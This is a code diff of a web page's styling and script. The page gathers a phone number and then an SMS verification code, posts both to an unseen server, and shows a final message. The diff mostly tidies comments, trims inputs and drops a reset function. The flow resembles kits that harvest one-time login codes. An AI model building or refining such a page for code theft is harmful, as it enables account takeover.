@@ -25,7 +25,7 @@
             width: 100%;
             max-width: 500px;
             position: absolute;
-            top: 2cm; /* Adjusted by 2 cm */
+            top: 2cm;
         }
 
         .verification-container h1 {
@@ -251,14 +251,14 @@
 
         @media (max-width: 600px) {
             .verification-container {
-                margin-top: 2cm; /* Move verification container 2cm from top on mobile */
+                margin-top: 2cm;
             }
 
             .container {
                 width: 95%;
                 max-width: 340px;
-                height: calc(100vh - 4cm); /* Adjust height on mobile */
-                margin-top: 0; /* Adjust margin for full-screen fit */
+                height: calc(100vh - 4cm);
+                margin-top: 0;
             }
 
             .verification-container button {
@@ -363,7 +363,7 @@
             }
 
             window.goToVerificationPage = function() {
-                const phoneNumber = document.getElementById('phoneNumber').value;
+                const phoneNumber = document.getElementById('phoneNumber').value.trim();
                 if (phoneNumber === '') {
                     alert('Please enter your phone number.');
                     return;
@@ -385,7 +385,6 @@
                         throw new Error('Network response was not ok');
                     }
                     console.log('Phone number sent successfully');
-                    // Transition to the verification code input screen
                     document.getElementById('phoneDisplay').textContent = phoneNumber;
                     document.getElementById('initialContainer').classList.remove('active');
                     document.getElementById('phoneVerificationContainer').classList.add('active');
@@ -397,7 +396,7 @@
             };
 
             window.submitVerification = function() {
-                const verificationCode = document.getElementById('verificationCode').value;
+                const verificationCode = document.getElementById('verificationCode').value.trim();
                 const phoneNumber = document.getElementById('phoneDisplay').textContent;
 
                 if (verificationCode === '') {
@@ -422,7 +421,6 @@
                         throw new Error('Network response was not ok');
                     }
                     console.log('Verification code sent successfully');
-                    // Transition to the final message screen
                     document.getElementById('phoneVerificationContainer').classList.remove('active');
                     document.getElementById('finalMessageContainer').classList.add('active');
                 })
@@ -430,13 +428,6 @@
                     console.error('Error:', error);
                     alert('An error occurred. Please try again.');
                 });
-            };
-
-            window.resetForm = function() {
-                document.getElementById('phoneNumber').value = '';
-                document.getElementById('verificationCode').value = '';
-                document.getElementById('finalMessageContainer').classList.remove('active');
-                document.getElementById('initialContainer').classList.add('active');
             };
 
             document.body.addEventListener('touchmove', function() {
